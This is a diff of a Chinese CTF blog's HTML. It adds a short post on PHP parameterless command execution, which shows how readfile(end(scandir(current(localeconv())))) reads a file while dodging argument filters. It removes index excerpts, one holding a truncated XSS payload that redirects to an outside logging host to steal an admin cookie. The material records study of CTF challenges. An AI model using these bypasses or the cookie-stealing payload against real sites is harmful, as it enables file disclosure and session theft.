@@ -22,7 +22,7 @@
     <meta name="description" content="fighting">
     <meta http-equiv="Cache-control" content="no-cache">
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
-    <title>来都来了，看下再走呀</title>
+    <title>PHP无参数命令执行 · 来都来了，看下再走呀</title>
     <style type="text/css">
     @font-face {
         font-family: 'Oswald-Regular';
@@ -77,6 +77,8 @@
 
     <link rel="preload" href="/css/style.css?v=20180824" as="style" onload="this.onload=null;this.rel='stylesheet'">
     <link rel="stylesheet" href="/css/mobile.css?v=20180824" media="(max-width: 980px)">
+    
+    <link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
     
     <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
 /* This file is meant as a standalone workflow for
@@ -201,14 +203,23 @@
 <link rel="stylesheet" href="/css/prism.css" type="text/css"></head>
 
     
-        <body class="home-body">
+        <body class="post-body">
     
     
-<header class="header index-header">
+<header class="header">
 
     <div class="read-progress"></div>
     <div class="header-sidebar-menu">&#xe775;</div>
     <!-- post页的toggle banner  -->
+    
+    <div class="banner">
+            <div class="blog-title">
+                <a href="/" >Ther&#39; or 1=2#</a>
+            </div>
+            <div class="post-title">
+                <a href="#" class="post-name">PHP无参数命令执行</a>
+            </div>
+    </div>
     
     <a class="home-link" href=/>Ther' or 1=2#</a>
 </header>
@@ -227,17 +238,17 @@ height:50vh;
     <!-- 主页  -->
     
     
-    <!-- 文章页  -->
+    <!-- 404页  -->
             
     <div class="site-intro-placeholder"></div>
-    <div class="site-intro-img" style="background-image: url(/intro/index-bg.jpg)"></div>
+    <div class="site-intro-img" style="background-image: url(/intro/post-bg.jpg)"></div>
     <div class="site-intro-meta">
         <!-- 标题  -->
         <h1 class="intro-title">
             <!-- 主页  -->
             
-            Ther' or 1=2#
-            <!-- 文章页  -->
+            PHP无参数命令执行
+            <!-- 404 -->
             
         </h1>
         <!-- 副标题 -->
@@ -245,12 +256,49 @@ height:50vh;
             <!-- 主页副标题  -->
             
             
-                没有运气，只有你坚持的勇气！
-            
-            <!-- 文章页  -->
+            <!-- 404 -->
             
         </p>
         <!-- 文章页meta -->
+        
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                
+                    <div class= post-intro-tags >
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "学习总结">学习总结</a>
+    
+</div>
+                
+                
+                    <div class="post-intro-read">
+                        <span>字数统计: <span class="post-count word-count">621</span>阅读时长: <span class="post-count reading-time">2 min</span></span>
+                    </div>
+                
+                <div class="post-intro-meta">
+                    <span class="post-intro-calander iconfont-archer">&#xe676;</span>
+                    <span class="post-intro-time">2019/12/28</span>
+                    
+                    <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                        <span class="iconfont-archer">&#xe602;</span>
+                        <span id="busuanzi_value_page_pv"></span>
+                    </span>
+                    
+                    <span class="shareWrapper">
+                        <span class="iconfont-archer shareIcon">&#xe71d;</span>
+                        <span class="shareText">Share</span>
+                        <ul class="shareList">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
         
     </div>
 </div>
@@ -351,21 +399,10 @@ height:50vh;
 </script>        
         <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
         <div class="container container-unloaded">
-            <main class="main index-page">
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href = "/2019/12/28/PHP无参数命令执行/" >
-            
-                <span>PHP无参数命令执行</span>
-        </a>
-        <div class="abstract-content">
-            PHP无参数命令执行常见函数
- getchwd() 函数返回当前工作目录。
+            <main class="main post-page">
+    <article class="article-entry">
+        <h4 id="PHP无参数命令执行"><a href="#PHP无参数命令执行" class="headerlink" title="PHP无参数命令执行"></a>PHP无参数命令执行</h4><p>常见函数</p>
+<pre><code> getchwd() 函数返回当前工作目录。
 
  scandir() 函数返回指定目录中的文件和目录的数组。
 
@@ -386,202 +423,87 @@ height:50vh;
  pos()  current()的别名 
 
  next() 函数将内部指针指向数组中的下一个元素,并输出。 
-...
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2019/12/28</span>
-            </div>
-            <!-- tags  -->
-            
-            <div class= abstract-tags >
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "学习总结">学习总结</a>
-    
-</div>
-            
-        </div>
+
+ end()  将内部指针指向数组中的最后一个元素,并输出。
+
+ array_rand()  函数返回数组中的随机键名,或者如果您规定函数返回不只一个键名,则返回包含随机键名的数组。
+
+ array_flip() 函数用于反转/交换数组中所有的键名以及它们关联的键值。 
+
+ array_slice() 函数在数组中根据条件取出一段值，并返回chr()函数从指定的ASCII值返回字符。
+
+ hex2bin — 转换十六进制字符串为二进制字符串 getenv() 获取一个环境变量的值(在7.1之后可以不给予参数)
+
+ print_r() 输出
+
+ readfile() 输出</code></pre><p>可以尝试用 readfile(end(scandir(“.”))) 来读取最后一个文件</p>
+<p> 关键在于如何绕过.</p>
+<p>可以采用 localeconv() 函数 </p>
+<p>localeconv() 函数返回一包含本地数字及货币格式信息的数组。</p>
+<p>localeconv() 函数会返回以下数组元素：</p>
+<ul>
+<li>[decimal_point] - 小数点字符</li>
+<li>[thousands_sep] - 千位分隔符</li>
+<li>[int_curr_symbol] - 货币符号 （例如：USD）</li>
+<li>[currency_symbol] - 货币符号 （例如：$）</li>
+<li>[mon_decimal_point] - 货币小数点字符</li>
+<li>[mon_thousands_sep] - 货币千位分隔符</li>
+<li>[positive_sign] - 正值字符</li>
+<li>[negative_sign] - 负值字符</li>
+<li>[int_frac_digits] - 国际通用小数位</li>
+<li>[frac_digits] - 本地通用小数位</li>
+<li>[p_cs_precedes] - 如果货币符号在一个正数值之前显示，则为 True（1），如果在正数值之后显示，则为 False（0）</li>
+<li>[p_sep_by_space] - 如果在货币符号和正数值之间包含空格，则为 True（1），否则为 False（0）</li>
+<li>[n_cs_precedes] - 如果货币符号在一个负数值之前显示，则为 True（1），如果在负数值之后显示，则为 False（0）</li>
+<li>[n_sep_by_space] - 如果在货币符号和负数值之间包含空格，则为 True（1），否则为 False（0）</li>
+<li>[p_sign_posn] - 格式化选项：</li>
+</ul>
+<p>也就是说 . 可以由current(localeconv)构造</p>
+<p>readfile(end(scandir(“.”))) 变成 readfile(end(scandir(current(localeconv))))</p>
+<p>可以读取当前目录下最后一个文件</p>
+<p>剩下怎么利用就具体情况具体分析</p>
+
     </article>
+    <!-- license  -->
     
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href = "/2019/12/26/CISCN2019-华东北赛区-WEB2/" >
-            
-                <span>CISCN2019 华东北赛区 WEB2</span>
-        </a>
-        <div class="abstract-content">
-            BUUCTF
-CISCN 华东北赛区 WEB2
-首先注册,注册完成之后发现以下功能
-
-在投稿功能发现()被替换成（和）,又看到发表文章之后可以反馈给管理员
-猜测是XSS拿管理员cooike
-
-绕过方法可以根据 HTML Markup 
- HTML Markup: https://www.w3.org/MarkUp/html-spec/html-spec_13.html 
-用了赵师傅的脚本：
-str_= "(function(){window.location.href='http://xss.buuoj.cn/index.php?do=api&amp;id=oqtBDY&amp;keep...
+        <div class="license-wrapper">
+            <p>原文作者：<a href="https://meetl.github.io">Meetl</a>
+            <p>原文链接：<a href="https://meetl.github.io/2019/12/28/PHP无参数命令执行/">https://meetl.github.io/2019/12/28/PHP无参数命令执行/</a>
+            <p>发表日期：<a href="https://meetl.github.io/2019/12/28/PHP无参数命令执行/">十二月 28日 2019, 2:08:15 凌晨</a>
+            <p>更新日期：<a href="https://meetl.github.io/2019/12/28/PHP无参数命令执行/">December 28th 2019, 2:09:10 am</a>
+            <p>版权声明：本文采用<a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
         </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2019/12/26</span>
-            </div>
-            <!-- tags  -->
-            
-            <div class= abstract-tags >
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "BUUCTF web">BUUCTF web</a>
-    
-</div>
-            
-        </div>
-    </article>
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href = "/2019/12/26/CISCN2019-华北赛区-Day1-Web2-ikun/" >
-            
-                <span>CISCN2019 华北赛区 Day1 Web2 ikun</span>
-        </a>
-        <div class="abstract-content">
-            访问页面,做得挺好
-
-发现要买lv6
-
-找了几个页面没有
-写了个脚本跑一下
-import requests
-sturl='http://a970a569-0019-4e3a-82c2-a88ec7eb40b0.node3.buuoj.cn/shop?page='
-for i in range (1,2000):
-    res=requests.get(sturl+str(i))
-    if 'lv6.png' in res.text:
-        print (i)
-        break
-    sleep(0.4)
-
-
-找到之后，审计源码,修改折扣为一个很小的数，购买成功...
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2019/12/26</span>
-            </div>
-            <!-- tags  -->
-            
-            <div class= abstract-tags >
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "BUUCTF web">BUUCTF web</a>
-    
-</div>
-            
-        </div>
-    </article>
     
     <!-- paginator  -->
-    
-</main>
-            <!-- profile -->
+    <ul class="post-paginator">
+        <li class="next">
             
-            <div class="profile">
-    <img class="profile-avatar" alt="avatar" src= /avatar/Alone.jpg >
-    <div class="profile-name">Ther</div>
-    
-    <div class="profile-signature">
-        生生灯火，明暗无辄
-    </div>
-    
-    
-    <div class="profile-social">
-        
-    
-        
+        </li>
+        <li class="previous">
             
-                <a href="mailto:1078340014@qq.com" class="iconfont-archer email" title=email ></a>
+                <div class="prevSlogan">Previous Post</div>
+                <a href= "/2019/12/26/CISCN2019-华东北赛区-WEB2/" title= "CISCN2019 华东北赛区 WEB2">
+                    <div class="prevTitle">CISCN2019 华东北赛区 WEB2</div>
+                </a>
             
-        
+        </li>
+    </ul>
+    <!-- 评论插件 -->
+    <!-- 来必力City版安装代码 -->
+
+<!-- City版安装代码已完成 -->
     
-        
-            
-                <a href="https://github.com/Meetl" class="iconfont-archer github" target="_blank" title=github></a>
-            
-        
     
-        
+    <!-- partial('_partial/comment/changyan') -->
+    <!--PC版-->
+
+
     
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
     
 
-    </div>
-    
-    
-        <div class="friends">
-            <div>FRIENDS</div>
-            
-                
-                    <span>
-                        <a href= //www.baidu.com target="_black">friendA</a>
-                    </span>
-                
-            
-                
-                    <span>
-                        <a href= //www.google.com target="_black">friendB</a>
-                    </span>
-                
-            
-                
-            
-        </div>
-    
-    
-        <div class="about-me">
-            <a href = "/about" >ABOUT ME</a>
-        </div>
-    
-</div>
+    <!-- 评论 -->
+</main>
+            <!-- profile -->
             
         </div>
         <footer class="footer footer-unloaded">
@@ -657,6 +579,24 @@ for i in range (1,2000):
 </footer>
     </div>
     <!-- toc -->
+    
+    <div class="toc-wrapper" style=
+    
+
+
+
+
+
+
+
+top:50vh;
+
+    >
+        <div class="toc-catalog">
+            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+        </div>
+        <ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#PHP无参数命令执行"><span class="toc-number">1.</span> <span class="toc-text">PHP无参数命令执行</span></a></li></ol>
+    </div>
     
     <div class="back-top iconfont-archer">&#xe639;</div>
     <div class="sidebar sidebar-hide">
@@ -800,6 +740,8 @@ jsonContent:
     
     </div>
     <!-- async load share.js -->
+    
+        <script src="/scripts/share.js" async></script>    
      
     </body>
 </html>
